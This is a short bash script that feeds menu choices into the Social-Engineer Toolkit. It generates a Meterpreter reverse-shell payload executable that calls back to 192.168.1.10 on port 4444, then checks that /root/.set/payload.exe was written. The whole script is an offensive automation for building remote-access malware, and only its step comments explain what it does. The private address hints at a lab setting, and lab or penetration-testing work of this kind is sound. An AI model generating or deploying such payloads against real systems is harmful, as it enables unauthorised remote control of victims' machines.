#!/bin/bash

# 1. Run SET in background and pipe inputs
# We send an empty enter first (for the disclaimer), then menu choices:
# 1 (Social-Engineering) -> 4 (Payload) -> 2 (Meterpreter) -> IP -> Port -> yes
echo "[*] Generating payload..."
(sleep 2; printf "\n1\n4\n2\n192.168.1.10\n4444\nyes\n") | setoolkit &

# 2. Wait for generation to complete
# We wait 25 seconds to ensure the payload is written to disk
sleep 25

# 3. Verify output
if [ -f /root/.set/payload.exe ]; then
    echo "SET Payload generated successfully"
else
    echo "Error: Payload not found"
fi
